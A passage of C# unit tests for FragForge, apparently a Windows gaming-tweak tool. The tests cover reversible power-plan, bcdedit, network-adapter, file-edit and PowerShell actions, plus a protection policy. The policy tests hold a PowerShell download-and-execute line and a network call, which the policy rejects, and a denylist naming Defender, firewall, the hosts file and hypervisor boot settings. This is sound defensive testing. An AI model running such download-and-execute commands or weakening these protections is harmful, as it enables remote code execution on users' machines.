        public bool HasCommand(params string[] prefix) => Commands.Any(c => prefix.Select((p, i) => c.Split(' ')[i].Equals(p, StringComparison.OrdinalIgnoreCase)).All(x => x));
    }

    [Fact]
    public async Task Apply_DuplicatesAndActivates_RevertReactivatesPreviousAndDeletesCreatedPlan()
    {
        var simulator = new PowerCfgSimulator();
        var action = new PowerPlanAction(simulator.Runner, Spec_());
        var context = Context();
        var before = await action.CaptureAsync(context);
        await action.ApplyAsync(before, context);
        Assert.True(simulator.HasCommand("/duplicatescheme"), "duplicatescheme");
        Assert.True(simulator.HasCommand("/setactive", PlanGuid), "setactive new plan");
        Assert.True(simulator.HasCommand("/setacvalueindex"), "setacvalueindex");
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, context)).Outcome);
        await action.RevertAsync(before, context);
        Assert.True(simulator.HasCommand("/setactive", PreviousGuid), "reactivate previous");
        Assert.True(simulator.HasCommand("/delete", PlanGuid), "delete created plan");
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyRevertAsync(before, context)).Outcome);
    }

    [Fact]
    public async Task Revert_DoesNotDeletePreExistingPlanAndRestoresItsSettings()
    {
        var simulator = new PowerCfgSimulator { PlanExists = true, ActiveIsFragForge = false };
        var action = new PowerPlanAction(simulator.Runner, Spec_());
        var context = Context();
        var before = await action.CaptureAsync(context);
        Assert.True(((PowerPlanActionState)before).PlanExisted);
        Assert.Equal(5, ((PowerPlanActionState)before).Settings[0].AcIndex);
        await action.ApplyAsync(before, context);
        await action.RevertAsync(before, context);
        Assert.False(simulator.HasCommand("/delete"), "must never delete a pre-existing plan");
        Assert.True(simulator.HasCommand("/setactive", PreviousGuid), "reactivate previous");
        Assert.Equal(5, simulator.AcIndex);
    }

    [Fact]
    public async Task Capture_ExportsPowArtifactBeforeApply()
    {
        using var directory = new TempDirectory();
        var simulator = new PowerCfgSimulator { PlanExists = true };
        var action = new PowerPlanAction(simulator.Runner, Spec_());
        var before = await action.CaptureAsync(Context() with { ArtifactDirectory = directory.Path });
        Assert.NotNull(((PowerPlanActionState)before).ExportArtifact);
        Assert.True(simulator.HasCommand("/export"));
        Assert.True(File.Exists(Path.Combine(directory.Path, ((PowerPlanActionState)before).ExportArtifact!)));
    }

    [Fact]
    public void InvalidSourceGuid_IsRejectedEagerly()
    {
        Assert.Throws<CatalogValidationException>(() => new PowerPlanAction(new FakeProcessRunner(), Spec.Action("PowerPlan", new { planName = "X", sourceSchemeGuid = "not-a-guid" })));
    }

    [Fact]
    public void AmbiguousPlanNames_AreRejected()
    {
        var runner = new FakeProcessRunner { Handler = request => string.Join(' ', request.Arguments) switch { "/list" => new ProcessResult(0, $"Power Scheme GUID: {PlanGuid}  (FragForge Performance)\nPower Scheme GUID: {PreviousGuid}  (fragforge performance)", "", false), "/getactivescheme" => new ProcessResult(0, $"Power Scheme GUID: {PreviousGuid}  (Balanced)", "", false), _ => new ProcessResult(0, "", "", false) } };
        var action = new PowerPlanAction(runner, Spec_());
        var ex = Assert.ThrowsAsync<FragForgeException>(() => action.CaptureAsync(Context())).GetAwaiter().GetResult();
        Assert.Equal("ambiguous_power_plan", ex.Code);
    }
}

public sealed class BcdeditActionTests
{
    private static ActionExecutionContext Context(TempDirectory directory) => new() { OperationId = "test", Hardware = TestProfiles.Pn64(), ArtifactDirectory = directory.Path };
    private static FakeProcessRunner Runner(string? current)
    {
        var runner = new FakeProcessRunner();
        runner.Handler = request =>
        {
            var joined = string.Join(' ', request.Arguments);
            if (joined.StartsWith("/enum", StringComparison.Ordinal)) return new ProcessResult(0, current is null ? "The boot configuration data store could not be opened." : $"identifier              {{current}}\ndisabledynamictick      {current}", "", false);
            if (joined.StartsWith("/export", StringComparison.Ordinal)) { File.WriteAllText(request.Arguments[1], "BCD"); return new ProcessResult(0, "The operation completed successfully.", "", false); }
            return new ProcessResult(0, "The operation completed successfully.", "", false);
        };
        return runner;
    }
    private static BcdeditAction Create(FakeProcessRunner runner, string element = "disabledynamictick", string value = "Yes") => new(runner, ProtectionPolicy.CreateDefault(), Spec.Action("Bcdedit", new { element, value }));

    [Fact]
    public async Task Apply_ExportsThenSets_RevertDeletesWhenAbsentOriginally()
    {
        using var directory = new TempDirectory();
        var runner = Runner(current: null);
        var action = Create(runner);
        var context = Context(directory);
        var before = await action.CaptureAsync(context);
        Assert.False(((BcdActionState)before).Existed);
        await action.ApplyAsync(before, context);
        Assert.Contains(runner.Requests, r => r.Arguments.Count > 0 && r.Arguments[0] == "/set");
        Assert.True(File.Exists(Path.Combine(directory.Path, "bcd-disabledynamictick.bcd")));
        await action.RevertAsync(before, context);
        Assert.Contains(runner.Requests, r => r.Arguments.Count > 0 && r.Arguments[0] == "/deletevalue");
    }

    [Fact]
    public async Task Revert_RestoresOriginalValue()
    {
        using var directory = new TempDirectory();
        var runner = Runner(current: "No");
        var action = Create(runner);
        var context = Context(directory);
        var before = await action.CaptureAsync(context);
        Assert.Equal("No", ((BcdActionState)before).PreviousValue);
        await action.ApplyAsync(before, context);
        await action.RevertAsync(before, context);
        Assert.Contains(runner.Requests, r => r.Arguments.Count > 1 && r.Arguments[0] == "/set" && r.Arguments[^1] == "No");
    }

    [Fact]
    public async Task Apply_FailsIfExportArtifactMissing()
    {
        var action = Create(Runner(current: "No"));
        var context = new ActionExecutionContext { OperationId = "test", Hardware = TestProfiles.Pn64() };
        var before = await action.CaptureAsync(context);
        await Assert.ThrowsAsync<InvalidOperationException>(() => action.ApplyAsync(before, context));
    }

    [Fact]
    public async Task ExistingExportArtifact_IsNeverOverwritten()
    {
        using var directory = new TempDirectory();
        await File.WriteAllTextAsync(Path.Combine(directory.Path, "bcd-disabledynamictick.bcd"), "ORIGINAL");
        var action = Create(Runner(current: "No"));
        await Assert.ThrowsAsync<InvalidOperationException>(() => action.CaptureAsync(Context(directory)));
        Assert.Equal("ORIGINAL", await File.ReadAllTextAsync(Path.Combine(directory.Path, "bcd-disabledynamictick.bcd")));
    }

    [Fact]
    public async Task BcdElementOutsideAllowlist_IsRejectedAtPreflight()
    {
        using var directory = new TempDirectory();
        var action = Create(new FakeProcessRunner(), element: "hypervisorlaunchtype", value: "off");
        await Assert.ThrowsAsync<ProtectedTargetException>(() => action.PreflightAsync(Context(directory)));
    }
}

public sealed class NetworkPropertyActionTests
{
    private static ActionExecutionContext Context() => new() { OperationId = "test", Hardware = TestProfiles.Pn64() };
    private static NetAdapterPropertyAction Create(FakeNetworkAdapterController controller, string keyword, params string[] value) => new(controller, ProtectionPolicy.CreateDefault(), Spec.Action("NetAdapterProperty", new { adapterName = "Ethernet", properties = new object[] { new { keyword, value } } }));

    [Fact]
    public async Task Apply_Revert_RestoresPreviousRegistryValue()
    {
        var controller = new FakeNetworkAdapterController();
        controller.Properties[("Ethernet", "*EEE")] = new NetworkPropertyCapture { AdapterName = "Ethernet", Keyword = "*EEE", Exists = true, RegistryValue = ["1"], DisplayValue = "Enabled" };
        var action = Create(controller, "*EEE", "0");
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal(["0"], controller.Properties[("Ethernet", "*EEE")].RegistryValue);
        await action.RevertAsync(before, Context());
        Assert.Equal(["1"], controller.Properties[("Ethernet", "*EEE")].RegistryValue);
    }

    [Fact]
    public async Task DenylistedWakeProperty_IsRejectedAtPreflight()
    {
        var controller = new FakeNetworkAdapterController();
        controller.Properties[("Ethernet", "*WakeOnMagicPacket")] = new NetworkPropertyCapture { AdapterName = "Ethernet", Keyword = "*WakeOnMagicPacket", Exists = true, RegistryValue = ["1"] };
        await Assert.ThrowsAsync<ProtectedTargetException>(() => Create(controller, "*WakeOnMagicPacket", "0").PreflightAsync(Context()));
    }

    [Fact]
    public async Task MissingKeyword_IsNotApplicable()
    {
        await Assert.ThrowsAsync<ActionNotApplicableException>(() => Create(new FakeNetworkAdapterController(), "*EEE", "0").PreflightAsync(Context()));
    }

    [Fact]
    public async Task AdapterToken_RequiresExactlyOnePhysicalMatch()
    {
        var controller = new FakeNetworkAdapterController();
        controller.Properties[("Ethernet", "*EEE")] = new NetworkPropertyCapture { AdapterName = "Ethernet", Keyword = "*EEE", Exists = true, RegistryValue = ["1"] };
        var action = new NetAdapterPropertyAction(controller, ProtectionPolicy.CreateDefault(), Spec.Action("NetAdapterProperty", new { adapterName = "{AdapterDescription:I225-V}", properties = new object[] { new { keyword = "*EEE", value = new[] { "0" } } } }));
        await action.PreflightAsync(Context());
        Assert.Contains("Ethernet", controller.Properties.Keys.Select(k => k.Adapter));
    }
}

public sealed class FileEditActionTests
{
    private static ActionExecutionContext Context() => new() { OperationId = "test", Hardware = TestProfiles.Pn64() };
    private static ActionSpec Spec_(string path, string pattern, string replacement) => FragForge.Tests.Fakes.Spec.Action("FileEdit", new { path, maxBytes = 4096, edits = new object[] { new { pattern, replacement, expectedMatches = 1 } } });

    [Fact]
    public async Task Apply_Revert_RestoresExactBytesAndTimestamp()
    {
        using var directory = new TempDirectory();
        var path = Path.Combine(directory.Path, "cs2.cfg");
        var original = "setting \"a\" \"1\"\nsetting \"b\" \"2\"\n";
        await File.WriteAllTextAsync(path, original, new UTF8Encoding(false));
        File.SetLastWriteTimeUtc(path, new DateTime(2026, 1, 2, 3, 4, 5, DateTimeKind.Utc));
        var action = new FileEditAction(ProtectionPolicy.CreateDefault(), Spec_(path, "setting \\\"a\\\" \\\"1\\\"", "setting \"a\" \"0\""));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Contains("\"0\"", await File.ReadAllTextAsync(path));
        await action.RevertAsync(before, Context());
        Assert.Equal(original, await File.ReadAllTextAsync(path));
        Assert.Equal(new DateTime(2026, 1, 2, 3, 4, 5, DateTimeKind.Utc), File.GetLastWriteTimeUtc(path));
    }

    [Fact]
    public async Task Revert_DeletesFileAndDirectoriesThatDidNotExist()
    {
        using var directory = new TempDirectory();
        var path = Path.Combine(directory.Path, "nested", "created.cfg");
        var action = new FileEditAction(ProtectionPolicy.CreateDefault(), FragForge.Tests.Fakes.Spec.Action("FileEdit", new { path, maxBytes = 4096, edits = new object[] { new { pattern = "x", replacement = "y", expectedMatches = 0 } } }));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.True(File.Exists(path));
        await action.RevertAsync(before, Context());
        Assert.False(File.Exists(path));
        Assert.False(Directory.Exists(Path.Combine(directory.Path, "nested")));
    }

    [Fact]
    public async Task Drift_AfterCapture_IsRefused()
    {
        using var directory = new TempDirectory();
        var path = Path.Combine(directory.Path, "cs2.cfg");
        await File.WriteAllTextAsync(path, "value 1");
        var action = new FileEditAction(ProtectionPolicy.CreateDefault(), Spec_(path, "value 1", "value 2"));
        var before = await action.CaptureAsync(Context());
        await File.WriteAllTextAsync(path, "changed externally");
        await Assert.ThrowsAsync<VerificationFailedException>(() => action.ApplyAsync(before, Context()));
    }

    [Fact]
    public void SystemPathsAndExecutables_AreRejected()
    {
        var policy = ProtectionPolicy.CreateDefault();
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureFileAllowed(@"C:\Windows\System32\drivers\etc\hosts"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureFileAllowed(@"C:\Temp\evil.exe"));
        policy.EnsureFileAllowed(@"C:\Program Files (x86)\Steam\steamapps\common\Counter-Strike Global Offensive\game\csgo\cfg\autoexec.cfg");
    }
}

public sealed class InspectOnlyActionTests
{
    [Fact]
    public async Task Inspection_NeverWritesAndReportsObservations()
    {
        var registry = new FakeRegistry();
        registry.Set(@"HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers", "HwSchMode", "DWord", 1);
        var action = new FragForge.Actions.Diagnostics.InspectOnlyAction(FragForge.Actions.Diagnostics.DiagnosticProbeFactory.CreateDefaults(registry), FragForge.Tests.Fakes.Spec.Action("InspectOnly", new { probes = new[] { "hags", "vbs" } }));
        var context = new ActionExecutionContext { OperationId = "test", Hardware = TestProfiles.Pn64() };
        var state = await action.CaptureAsync(context);
        var inspection = Assert.IsType<InspectionActionState>(state);
        Assert.Contains(inspection.Observations, o => o.Key == "hags" && o.Value == "Disabled");
        await action.ApplyAsync(state, context);
        await action.RevertAsync(state, context);
        Assert.Empty(registry.Writes);
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyRevertAsync(state, context)).Outcome);
    }
}

public sealed class PowerShellActionTests
{
    private static ActionExecutionContext Context(bool allowed) => new() { OperationId = "test", Hardware = TestProfiles.Pn64(), AllowPowerShellActions = allowed };
    private static FragForge.Actions.Scripting.PowerShellAction Create(FakeProcessRunner runner) => new(runner, ProtectionPolicy.CreateDefault(), Spec.Action("PowerShell", new { captureScript = "'{}'", applyScript = "'ok'", verifyScript = "'{\"matches\":true,\"message\":\"ok\"}'", revertScript = "'ok'", timeoutSeconds = 30 }));

    [Fact]
    public async Task DisabledByDefault_EvenIfCatalogAsksForIt()
    {
        var action = Create(new FakeProcessRunner());
        await Assert.ThrowsAsync<ProtectedTargetException>(() => action.PreflightAsync(Context(false)));
    }

    [Fact]
    public async Task EnabledWithFlag_CapturesAndVerifiesJson()
    {
        var runner = new FakeProcessRunner { Handler = request => request.Arguments[^1].Contains("matches", StringComparison.Ordinal) ? new ProcessResult(0, "{\"matches\":true,\"message\":\"ok\"}", "", false) : new ProcessResult(0, "{\"value\":1}", "", false) };
        var action = Create(runner);
        var context = Context(true);
        await action.PreflightAsync(context);
        var before = await action.CaptureAsync(context);
        await action.ApplyAsync(before, context);
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, context)).Outcome);
        await action.RevertAsync(before, context);
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyRevertAsync(before, context)).Outcome);
    }

    [Fact]
    public void NetworkTokens_AreRejected()
    {
        var runner = new FakeProcessRunner();
        var action = new FragForge.Actions.Scripting.PowerShellAction(runner, ProtectionPolicy.CreateDefault(), Spec.Action("PowerShell", new { captureScript = "Invoke-WebRequest https://example.com", applyScript = "'ok'", verifyScript = "'{}'", revertScript = "'ok'", timeoutSeconds = 30 }));
        Assert.ThrowsAsync<ProtectedTargetException>(() => action.PreflightAsync(Context(true))).GetAwaiter().GetResult();
    }
}
````

### `tests/FragForge.Tests/Catalog/CatalogTests.cs`  <sub>(163 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Conditions;
using FragForge.Core.Models;
using FragForge.Tests.Fakes;
using FragForge.Tweaks;
using FragForge.Tweaks.Validation;
using FragForge.Actions.DependencyInjection;
using FragForge.Actions.Diagnostics;
using Xunit;

namespace FragForge.Tests.Catalog;

public sealed class CatalogTests
{
    private static (JsonTweakCatalogLoader Loader, JsonSchemaValidator Schema) CreateLoader()
    {
        var schema = new JsonSchemaValidator(JsonTweakCatalogLoader.ReadEmbeddedSchema());
        var registry = new FakeRegistry();
        var policy = FragForge.Core.Persistence.ProtectionPolicy.CreateDefault();
        var services = new FakeServiceController();
        var tasks = new FakeScheduledTaskStore();
        var network = new FakeNetworkAdapterController();
        var runner = new FakeProcessRunner();
        var factory = new TweakActionFactory(registry, policy, services, tasks, network, runner, DiagnosticProbeFactory.CreateDefaults(registry));
        var validator = new TweakCatalogValidator(schema, new ConditionFactory(), factory);
        return (new JsonTweakCatalogLoader(validator), schema);
    }

    [Fact]
    public async Task EmbeddedCatalog_LoadsExactlyTenValidTweaks_WithBothCultures()
    {
        var (loader, _) = CreateLoader();
        var catalog = await loader.LoadEmbeddedAsync();
        Assert.Equal(10, catalog.Definitions.Count);
        Assert.All(catalog.Definitions, d =>
        {
            Assert.False(string.IsNullOrWhiteSpace(d.Title.EsMx));
            Assert.False(string.IsNullOrWhiteSpace(d.Title.EnUs));
            Assert.NotEmpty(d.References);
            Assert.NotEmpty(d.Actions);
        });
        Assert.Contains(catalog.Definitions, d => d.Id == "power.fragforge-performance");
        Assert.Contains(catalog.Definitions, d => d.Id == "network.i225v-eee-off");
        Assert.Contains(catalog.Definitions, d => d.Id == "cs2.fullscreen-optimizations-off");
        Assert.Single(catalog.Definitions, d => d.ReadOnly);
    }

    [Fact]
    public async Task Catalog_IsSortedAndHashesAreStableAndDistinct()
    {
        var (loader, _) = CreateLoader();
        var first = await loader.LoadEmbeddedAsync();
        var second = await loader.LoadEmbeddedAsync();
        Assert.Equal(first.Definitions.Select(d => d.Id), first.Definitions.Select(d => d.Id).OrderBy(id => id, StringComparer.OrdinalIgnoreCase));
        var hashes = first.Definitions.Select(d => first.GetDefinitionHash(d.Id)).ToArray();
        Assert.Equal(hashes.Length, hashes.Distinct().Count());
        Assert.Equal(hashes, second.Definitions.Select(d => second.GetDefinitionHash(d.Id)).ToArray());
    }

    [Fact]
    public async Task Catalog_UnknownTweak_Throws()
    {
        var (loader, _) = CreateLoader();
        var catalog = await loader.LoadEmbeddedAsync();
        Assert.Throws<KeyNotFoundException>(() => catalog.Get("does.not.exist"));
        Assert.False(catalog.TryGet("does.not.exist", out _));
    }

    [Fact]
    public void Schema_RejectsMissingRequiredFields_AndUnknownProperties()
    {
        var (_, schema) = CreateLoader();
        using var missing = JsonDocument.Parse("""{"id":"x.y","category":"Latency"}""");
        var errors = schema.Validate(missing.RootElement);
        Assert.Contains(errors, e => e.Contains("title", StringComparison.Ordinal));
        using var extra = JsonDocument.Parse("""{"id":"x.y","category":"Latency","title":{"es-MX":"a","en-US":"b"},"description":{"es-MX":"a","en-US":"b"},"evidence":"High","risk":"Safe","expectedImpact":{},"actions":[{"kind":"Registry"}],"references":["r"],"placebo":true}""");
        Assert.Contains(schema.Validate(extra.RootElement), e => e.Contains("placebo", StringComparison.Ordinal));
    }

    [Fact]
    public void Schema_RejectsBadCategoryAndMissingEnglish()
    {
        var (_, schema) = CreateLoader();
        using var document = JsonDocument.Parse("""{"id":"x.y","category":"Overclock","title":{"es-MX":"a"},"description":{"es-MX":"a","en-US":"b"},"evidence":"High","risk":"Safe","expectedImpact":{},"actions":[{"kind":"Registry"}],"references":["r"]}""");
        var errors = schema.Validate(document.RootElement);
        Assert.Contains(errors, e => e.Contains("enum", StringComparison.Ordinal));
        Assert.Contains(errors, e => e.Contains("category", StringComparison.Ordinal) || e.Contains("en-US", StringComparison.Ordinal));
    }

    [Fact]
    public void Validator_RejectsDuplicateIdsAndUnknownKinds()
    {
        var (loader, _) = CreateLoader();
        var duplicate = """{"id":"dup.one","category":"Latency","title":{"es-MX":"a","en-US":"a"},"description":{"es-MX":"a","en-US":"a"},"evidence":"High","risk":"Safe","expectedImpact":{},"actions":[{"kind":"Registry","parameters":{"values":[]}}],"references":["r"]}""";
        var ex = Assert.Throws<CatalogValidationException>(() => loader.LoadDocuments([("a.json", duplicate)]));
        Assert.Contains(ex.Errors, e => e.Contains("values", StringComparison.Ordinal) || e.Contains("Registry", StringComparison.Ordinal));
        var unknownKind = duplicate.Replace("\"dup.one\"", "\"dup.two\"").Replace("\"Registry\"", "\"Teleport\"");
        var ex2 = Assert.Throws<CatalogValidationException>(() => loader.LoadDocuments([("b.json", unknownKind)]));
        Assert.Contains(ex2.Errors, e => e.Contains("Teleport", StringComparison.Ordinal));
    }

    [Fact]
    public void Validator_RejectsSelfDependencyAndMissingReferences()
    {
        var (loader, _) = CreateLoader();
        var selfDependency = """{"id":"dup.three","category":"Latency","title":{"es-MX":"a","en-US":"a"},"description":{"es-MX":"a","en-US":"a"},"evidence":"High","risk":"Safe","dependsOn":["dup.three"],"expectedImpact":{},"actions":[{"kind":"IfeoPerfOptions","parameters":{"imageName":"cs2.exe","priorityClass":3}}],"references":["r"]}""";
        var ex = Assert.Throws<CatalogValidationException>(() => loader.LoadDocuments([("c.json", selfDependency)]));
        Assert.Contains(ex.Errors, e => e.Contains("consigo mismo", StringComparison.Ordinal));
    }

    [Fact]
    public void Validator_RequiresAdvancedRiskForPowerShellAndBcdedit()
    {
        var (loader, _) = CreateLoader();
        var bcd = """{"id":"dup.four","category":"Latency","title":{"es-MX":"a","en-US":"a"},"description":{"es-MX":"a","en-US":"a"},"evidence":"Experimental","risk":"Safe","expectedImpact":{},"actions":[{"kind":"Bcdedit","parameters":{"element":"disabledynamictick","value":"yes"}}],"references":["r"]}""";
        var ex = Assert.Throws<CatalogValidationException>(() => loader.LoadDocuments([("d.json", bcd)]));
        Assert.Contains(ex.Errors, e => e.Contains("Advanced", StringComparison.Ordinal));
    }

    [Fact]
    public async Task EverySeedTweak_HasHonestMetadata()
    {
        var (loader, _) = CreateLoader();
        var catalog = await loader.LoadEmbeddedAsync();
        foreach (var definition in catalog.Definitions.Where(d => !d.ReadOnly))
        {
            Assert.True(definition.RequiresAdmin);
            Assert.NotNull(definition.WhenNotToApply);
            Assert.False(string.IsNullOrWhiteSpace(definition.Notes?.EsMx));
        }
        Assert.DoesNotContain(catalog.Definitions, d => d.Actions.Any(a => a.Kind.Equals("Service", StringComparison.OrdinalIgnoreCase) && a.Parameters.ToString().Contains("WinDefend", StringComparison.OrdinalIgnoreCase)));
    }

    [Fact]
    public async Task ProfileSelection_MatchesDocumentedRiskGates()
    {
        var (loader, _) = CreateLoader();
        var catalog = await loader.LoadEmbeddedAsync();
        var safe = FragForge.Core.Engine.ProfileSelector.Select(catalog.Definitions, TweakProfile.Safe);
        var balanced = FragForge.Core.Engine.ProfileSelector.Select(catalog.Definitions, TweakProfile.Balanced);
        var competitive = FragForge.Core.Engine.ProfileSelector.Select(catalog.Definitions, TweakProfile.Competitive);
        var advanced = FragForge.Core.Engine.ProfileSelector.Select(catalog.Definitions, TweakProfile.Advanced);
        Assert.DoesNotContain(safe, d => d.Risk != RiskLevel.Safe);
        Assert.Contains(balanced, d => d.Id == "latency.game-dvr-capture-off");
        Assert.DoesNotContain(balanced, d => d.Tags.Contains("opt-in"));
        Assert.Contains(competitive, d => d.Id == "power.fragforge-performance");
        Assert.Equal(catalog.Definitions.Count, advanced.Count);
    }

    [Fact]
    public void Localization_LoadsBothLanguagesWithTheSameKeys()
    {
        var es = FragForge.Tweaks.Localization.LocalizationLoader.LoadAsync("es-MX").GetAwaiter().GetResult();
        var en = FragForge.Tweaks.Localization.LocalizationLoader.LoadAsync("en-US").GetAwaiter().GetResult();
        Assert.Equal("es-MX", es.Culture);
        Assert.Equal("en-US", en.Culture);
        Assert.NotEqual(es["nav.scan"], en["nav.scan"]);
        Assert.Equal("Operación en curso…", es["busy"]);
        Assert.Equal("Operation in progress…", en["busy"]);
        Assert.Equal("ACEPTO EL RIESGO", es["risk.phrase"]);
    }
}
````

### `tests/FragForge.Tests/Core/ConditionAndPolicyTests.cs`  <sub>(112 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Conditions;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using FragForge.Tests.Fakes;
using Xunit;

namespace FragForge.Tests.Core;

public sealed class ConditionAndPolicyTests
{
    private static ConditionResult Evaluate(string type, object? parameters = null, HardwareProfile? profile = null) => new ConditionFactory().Create(Spec.Condition(type, parameters)).Evaluate(profile ?? TestProfiles.Pn64());

    [Fact]
    public void Windows_AcceptsSupportedBuildRange_AndRejectsWindows10() => Assert.False(Evaluate("windows", new { minBuild = 26100, maxBuild = 26299 }, TestProfiles.Windows10()).IsMet);

    [Fact]
    public void Windows_IsUnknownOnUnsupportedPlatform()
    {
        var result = Evaluate("windows", null, TestProfiles.NonWindows());
        Assert.False(result.IsKnown);
        Assert.False(result.IsMet);
    }

    [Fact]
    public void HybridCpu_MetFor1220P_ButUnknownDoesNotBecomeFalse()
    {
        Assert.True(Evaluate("hybridCpu", new { expected = true }).IsMet);
        var unknown = TestProfiles.Pn64() with { Cpu = TestProfiles.Pn64().Cpu with { IsHybrid = null } };
        var result = Evaluate("hybridCpu", new { expected = true }, unknown);
        Assert.False(result.IsKnown);
        Assert.False(result.IsMet);
    }

    [Fact]
    public void GpuVendor_IntelIgpuMet_AndNvidiaTweakNotApplicable()
    {
        Assert.True(Evaluate("gpuVendor", new { vendor = "Intel" }).IsMet);
        Assert.False(Evaluate("gpuVendor", new { vendor = "Nvidia" }).IsMet);
        Assert.True(Evaluate("gpuVendor", new { vendor = "Nvidia" }, TestProfiles.GpuOnlyDiscrete()).IsMet);
    }

    [Fact]
    public void AdapterCondition_FindsI225V_AndIgnoresWifiWhenEthernetRequired()
    {
        Assert.True(Evaluate("adapter", new { descriptionContains = "I225-V", kind = "Ethernet", physicalOnly = true }).IsMet);
        Assert.False(Evaluate("adapter", new { descriptionContains = "I225-V", kind = "WiFi" }).IsMet);
    }

    [Fact]
    public void Cs2Condition_IsUnmetWhenNotInstalled() => Assert.False(Evaluate("cs2", new { installed = true }, TestProfiles.NoCs2()).IsMet);

    [Fact]
    public void MemoryChannels_DualOnPn64_SingleWhenProfileSaysSo()
    {
        Assert.True(Evaluate("memoryChannels", new { state = "Dual" }).IsMet);
        Assert.False(Evaluate("memoryChannels", new { state = "Dual" }, TestProfiles.SingleChannel()).IsMet);
        var unknown = TestProfiles.Pn64() with { Memory = TestProfiles.Pn64().Memory with { Channels = MemoryChannelState.Unknown } };
        Assert.False(Evaluate("memoryChannels", new { state = "Dual" }, unknown).IsKnown);
    }

    [Fact]
    public void SecurityCondition_UnknownIsNotTreatedAsDisabled()
    {
        var profile = TestProfiles.Pn64() with { Security = TestProfiles.Pn64().Security with { Vbs = FeatureState.Unknown } };
        var result = Evaluate("security", new { feature = "vbs", state = "Disabled" }, profile);
        Assert.False(result.IsKnown);
        Assert.False(result.IsMet);
        Assert.True(Evaluate("security", new { feature = "vbs", state = "Disabled" }).IsMet);
    }

    [Fact]
    public void UnknownConditionType_IsRejected()
    {
        var ex = Assert.Throws<CatalogValidationException>(() => new ConditionFactory().Create(Spec.Condition("telepathy")));
        Assert.Contains("telepathy", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Composite_Conditions_ShortCircuitDeterministically()
    {
        var result = Evaluate("all", new { conditions = new object[] { new { type = "windows" }, new { type = "cpuVendor", parameters = new { vendor = "Intel" } } } });
        Assert.True(result.IsMet);
        Assert.False(Evaluate("not", new { condition = new { type = "cpuVendor", parameters = new { vendor = "Intel" } } }).IsMet);
    }

    [Fact]
    public void Denylist_BlocksServicesTasksAndBcd()
    {
        var policy = ProtectionPolicy.CreateDefault();
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("WinDefend"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("mpssvc"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("ipfsvc"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("jhi_service"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureTaskAllowed(@"\Microsoft\Windows\WindowsUpdate\Scheduled Start"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureBcdAllowed("hypervisorlaunchtype"));
        policy.EnsureBcdAllowed("disabledynamictick");
        policy.EnsureServiceAllowed("DiagTrack");
        policy.EnsureServiceAllowed("SysMain");
    }

    [Fact]
    public void Denylist_BlocksNetworkWakePropertiesAndFileTargets()
    {
        var policy = ProtectionPolicy.CreateDefault();
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureNetworkPropertyAllowed("Ethernet", "**EEE"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureNetworkPropertyAllowed("Ethernet", "*RSS"));
        policy.EnsureNetworkPropertyAllowed("Ethernet", "*EEE");
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureFileAllowed(@"C:\Windows\System32\drivers\etc\hosts"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsurePowerShellAllowed("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')"));
    }
}
````

### `tests/FragForge.Tests/Core/EngineTestHarness.cs`  <sub>(57 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Conditions;
using FragForge.Core.Engine;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using FragForge.Core.Preflight;
using FragForge.Tests.Fakes;
using FragForge.Tweaks;
using Microsoft.Extensions.Logging.Abstractions;

namespace FragForge.Tests.Core;

public sealed class EngineTestHarness : IDisposable
{
    public FakeRegistry Registry { get; } = new();
    public FakeHardwareProfiler Profiler { get; } = new();
    public FakeSystemRestoreService Restore { get; } = new();
    public FakeJournal? JournalOverride { get; set; }
    public TempDirectory Directory { get; } = new();
    public FragForgePaths Paths { get; }
    public IJournal Journal { get; }
    public ISnapshotStore Snapshots { get; }
    public IProtectionPolicy Policy { get; } = ProtectionPolicy.CreateDefault();
    public FakeActionFactory Factory { get; }
    public TweakCatalog Catalog { get; private set; } = new([]);
    public string UserSid => TestProfiles.Pn64().InteractiveUserSid!;

    public EngineTestHarness(Dictionary<string, ScriptedActionOptions>? scripts = null, bool inMemoryJournal = false)
    {
        if (inMemoryJournal) JournalOverride = new FakeJournal();
        Paths = new FragForgePaths(Directory.Path);
        Paths.EnsureCreated();
        Journal = (IJournal?)JournalOverride ?? new FileJournal(Paths);
        Snapshots = new FileSnapshotStore(Paths);
        Factory = new FakeActionFactory(Registry, Policy, scripts);
    }
    public EngineTestHarness WithCatalog(params TweakDefinition[] definitions)
    {
        Catalog = new TweakCatalog(definitions);
        return this;
    }
    public EngineTestHarness WithProfile(HardwareProfile profile) { Profiler.Profile = profile; return this; }
    public TweakEngine CreateEngine(IEnumerable<IExperimentHook>? hooks = null) => new(
        Catalog,
        Profiler,
        Factory,
        new ConditionFactory(),
        Snapshots,
        Journal,
        Restore,
        new PreflightService(Restore, Catalog),
        new FileExecutionGate(Paths),
        hooks ?? [],
        NullLogger<TweakEngine>.Instance);
